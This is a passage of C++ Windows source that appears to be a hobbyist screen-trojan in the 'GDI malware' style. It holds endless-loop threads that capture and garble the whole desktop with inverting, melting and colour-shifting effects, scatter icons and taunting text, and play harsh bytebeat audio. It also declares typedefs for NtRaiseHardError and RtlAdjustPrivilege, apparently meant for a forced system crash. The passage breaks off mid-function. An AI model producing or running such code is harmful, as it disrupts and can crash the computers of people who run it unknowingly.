#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#include "stuff.h"
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	DOUBLE angle = 0.f;
	SetStretchBltMode(hdcCopy, 4);
	SetStretchBltMode(hdc, 4);
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int j = 4 * i;
				int fx = (int)(j + (j * sin(x / 16.0)) + j + (j * sin(y / 8.0)) + j + (j * sin((x + y) / 16.0)) + j + (j * sin(sqrt((double)(x * x + y * y)) / 8.0))) / 4;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;
				if (hslcolor.l < .4f) {
					hslcolor.l += .4f;
				}
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI hexagon(LPVOID lpvd) { //credits to CYBERWARE
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	float size = (w + h) / 10;
	float radius = size / 2;

	int cx = size;
	int cy = size;

	int xdv = 10;
	int ydv = 10;

	float angleX = 0.01;
	float angleY = 0.01;
	float angleZ = 0.01;

	int d = 60;

	VERTEX vtx[6];
	for (int i = 0; i < 6; i++) {
		float angle = (M_PI / 3) * i;
		vtx[i].x = radius * cos(angle);
		vtx[i].y = radius * sin(angle);
		vtx[i].z = 0;
	}

	EDGE edges[] =
	{
		{0, 1},
		{1, 2},
		{2, 3},
		{3, 4},
		{4, 5},
		{5, 0}
	};


	int index = rand() % 4;

	//Calculate the number of vertex and edges
	int totvtx = sizeof(vtx) / sizeof(vtx[0]);
	int totedg = sizeof(edges) / sizeof(edges[0]);

	while (true)
	{
		dc = GetDC(NULL);

		//Rotate Axis
		for (int i = 0; i < totvtx; i++)
		{
			_3D::RotateX(&vtx[i], angleX);
			_3D::RotateY(&vtx[i], angleY);
			_3D::RotateZ(&vtx[i], angleZ);
		}

		//Draw the edge
		for (int i = 0; i < totedg; i++)
		{
			_3D::DrawEdge(dc,
				vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy,
				vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy, 20);
		}

		Sleep(10);


		//Moves the tesseract around
		cx += xdv;
		cy += ydv;

		//Right and left collisions
		if (cx > w - (size / 2) || cx < -(size / 2))
		{
			xdv *= -1;
			index = rand() % 4;
		}

		//Top and bottom collisions
		if (cy > h - (size / 2) || cy < -(size / 2))
		{
			ydv *= -1;
			index = rand() % 4;
		}
		ReleaseDC(0, dc);
	}

	return 0x00;
}

DWORD WINAPI shader2(LPVOID lpvd) { //credits to Sensist2K05
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(0);
	int screenHeight = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	float colorShift = 400.0;
	float colorIntensity = 0.15;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				FLOAT fx = (y + i * 4);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI piez(LPVOID lpParam) {
	int sx = 1, sy = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hbsh);
		if (x != 0 && y != 0) Pie(hdc, x, y, x + 200, y + 200, rand() % x, rand() % y, rand() % x, rand() % y);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI abomination(LPVOID lpvd) { //credits to Sensist2K05, but i fixed it
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true) {
		hdc = GetDC(0);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		SetStretchBltMode(hdc, COLORONCOLOR);
		StretchBlt(hdcCopy, 0, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCINVERT);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 3, h / 3, SRCPAINT);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	return 0x00;
}

DWORD WINAPI melt(LPVOID lpParam) { //credits to Sensist2K05
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		int x = rand() % w;
		BitBlt(hdc, x, 10, 100, h, hdc, x, 0, SRCINVERT);
		BitBlt(hdc, x, -10, -100, h, hdc, x, 0, 0x999999);
		ReleaseDC(0, hdc);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	int ticks = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 1;; i++, i %= 21) {
		if (!i) for (int c = 0; c < 100; c++) InvalidateRect(0, 0, 0);
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0; BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000)
			bt = 2 + rand() & 255;
		for (int i = 1; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = 3 + rand() % 50;
			((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + bt))[bt] ^ i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcMem);
		DeleteObject(hdc);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int v = 1 + rand() % 13;
			((BYTE*)(data + i))[2] = ((BYTE*)(data + i + v + 22))[2] + 5.2;
			((BYTE*)(data + i))[1] = ((BYTE*)(data + i + v + 22))[1] + 5.2;
			((BYTE*)(data + i))[4] = ((BYTE*)(data + i + v + 22))[4] + 5.2;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}

DWORD WINAPI icons(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI glitch(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		int y = rand() % sh;
		int h = sh - rand() % sh - (sh / 1 - 8);
		int ColorRefReq = (rand() % 255) << 8;
		int ColorRef = (ColorRefReq | (rand() % 255)) << 8;
		HBRUSH brush = CreateSolidBrush(ColorRef | rand() % 255);
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 96 - 56, y, MERGECOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI triangle(LPVOID lpvd) { //credits to CYBERWARE
	HDC dc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(dc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	float size = (w + h) / 10;
	float radius = size / 2;

	int cx = size;
	int cy = size;

	int xdv = 10;
	int ydv = 10;

	float angleX = 0.01;
	float angleY = 0.01;
	float angleZ = 0.01;

	int d = 60;

	VERTEX vtx[] =
	{
		{size, 0, 0},
		{size / 2, size, 0},
		{0, 0, 0}
	};

	EDGE edges[] =
	{
		{0, 1},
		{1, 2},
		{2, 0}
	};


	int index = rand() % 4;

	//Calculate the number of vertex and edges
	int totvtx = sizeof(vtx) / sizeof(vtx[0]);
	int totedg = sizeof(edges) / sizeof(edges[0]);

	while (true)
	{
		dc = GetDC(NULL);

		//Rotate Axis
		for (int i = 0; i < totvtx; i++)
		{
			_3D::RotateX(&vtx[i], angleX);
			_3D::RotateY(&vtx[i], angleY);
			_3D::RotateZ(&vtx[i], angleZ);
		}

		//Draw the edge
		for (int i = 0; i < totedg; i++)
		{
			_3D::DrawEdge(dc,
				vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy,
				vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy, 20);
		}

		Sleep(10);


		//Moves the tesseract around
		cx += xdv;
		cy += ydv;

		//Right and left collisions
		if (cx > w - (size / 2) || cx < -(size / 2))
		{
			xdv *= -1;
			index = rand() % 4;
		}

		//Top and bottom collisions
		if (cy > h - (size / 2) || cy < -(size / 2))
		{
			ydv *= -1;
			index = rand() % 4;
		}
		ReleaseDC(0, dc);
	}

	return 0x00;
}

DWORD WINAPI shader5(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	int rgb = MAXDWORD64, v = 0, radius = 17.4f;
	double angle = 0;
	for (int i = 0;; i++, i %= 6) {
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = 1 + rand() % 6;
			rgb ^= (int)data + i % 255;
			((BYTE*)(data + i))[v] = rgb;
		}
		float x = cos(angle) * radius;
		float y = sin(angle) * radius;
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, NOTSRCERASE);
		ReleaseDC(0, hdc);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}

DWORD WINAPI kirurg(LPVOID lpParam) {
	while (true) {
		HDC desk = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		int rx = rand() % sw;
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, NOTSRCCOPY);
		StretchBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 100, rand() % 100, rand() % 100));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, SRCCOPY);
		BitBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, NOTSRCCOPY);
		StretchBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCCOPY);
		StretchBlt(desk, 10, 10, sw - 20, sh - 20, desk, 0, 0, sw, sh, SRCPAINT);
		StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, SRCPAINT);
		DeleteObject(brush);
		ReleaseDC(0, desk);
	}
}

DWORD WINAPI missingtexture(LPVOID lpParam) {
	int sx = 1, sy = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		HBRUSH hbsh = CreateSolidBrush(RGB(0, 0, 0));
		HBRUSH hbsh1 = CreateSolidBrush(RGB(255, 0, 255));
		SelectObject(hdc, hbsh);
		Rectangle(hdc, x, y, x + 50, y + 50);
		Rectangle(hdc, x + 50, y + 50, x + 100, y + 100);
		SelectObject(hdc, hbsh1);
		Rectangle(hdc, x + 50, y, x + 100, y + 50);
		Rectangle(hdc, x, y + 50, x + 50, y + 100);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		DeleteObject(hbsh);
		DeleteObject(hbsh1);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader6(LPVOID lpParam) {
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (sw * sh + sw) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	while (true) {
		HDC desk = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(desk);
		HBITMAP screenshot = CreateBitmap(sw, sh, 1, 32, data);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		GetBitmapBits(screenshot, sw * sh * 4, data);
		int v = rand() % 3, c = 0;
		if (v == 0) c = 2;
		if (v == 1) c = 1;
		if (v == 3) c = 4;
		for (int i = 0; i < sw * sh; i++) {
			((BYTE*)(data + i))[c] = i;
		}
		SetBitmapBits(screenshot, sw * sh * 4, data);
		BitBlt(desk, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteDC(hdcMem);
		DeleteObject(screenshot);
	}
}

DWORD WINAPI textout(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HFONT hfnt = CreateFontA(40, 20, rand() % 36, 0, FW_BOLD, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, hfnt);
		LPCSTR things[] = {
			"mkv", "what is going on?",
			"am I in Ohio?", "I can't feel anything!"
		};
		int thing = rand() % _countof(things);
		SetTextColor(hdc, Hue(239));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader7(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	int r = 2, g = 1, b = 4, c1 = r, c2 = r, c3 = r, v = 0;
	for (int i = 0;; i++, i %= 3) {
		for (int cn = 0; cn < 255 / 14; cn++) {
			HDC hdc = GetDC(0);
			HDC hdcMem = CreateCompatibleDC(hdc);
			HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
			SelectObject(hdcMem, hbm);
			BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
			GetBitmapBits(hbm, w * h * 4, data);
			for (int i = 0; w * h > i; i++) {
				int r = GetRValue(((BYTE*)(data + i))[2]) % 255;
				int g = GetGValue(((BYTE*)(data + i))[1]) % 255;
				int b = GetBValue(((BYTE*)(data + i))[4]) % 255;
				((BYTE*)(data + i))[c1] = (((BYTE*)(data + i))[c1]) + 5.f;
				((BYTE*)(data + i))[c2] = (((BYTE*)(data + i))[c2]) + 5.f;
				((BYTE*)(data + i))[c3] = (((BYTE*)(data + i))[c3]) + 5.f;
			}
			SetBitmapBits(hbm, w * h * 4, data);
			BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
			ReleaseDC(0, hdc);
			DeleteObject(hbm); DeleteObject(hdcMem);
			DeleteObject(hdc);
		}
		v++;
		if (v > 0) c2 = g;
		if (v > 1) {
			c3 = b;
		}
		if (v > 3) {
			c1 = r; c2 = r; c3 = r;
			v = 0;
		}
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 48000, 48000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[48000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t >> 10) != 0) buffer[t] = static_cast<char>(t * t >> 19 ^ t | t >> 2 % (t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t >> 3 ^ t >> 4 & t ^ t >> 18 | ~t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t + t % 27) & t >> 12) - 1;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t >> 3 * (t % 67 * t - t >> 3) & t >> 7 | t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(log(t ^ t * t >> 4) * t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 51966 & t >> 6 | t * 57005 & t >> 8) & (t >> 12 ? 127 : 63);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 48000, 48000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[48000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t + t ^ t * 20 ^ 30 + 40) >> 7 & t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
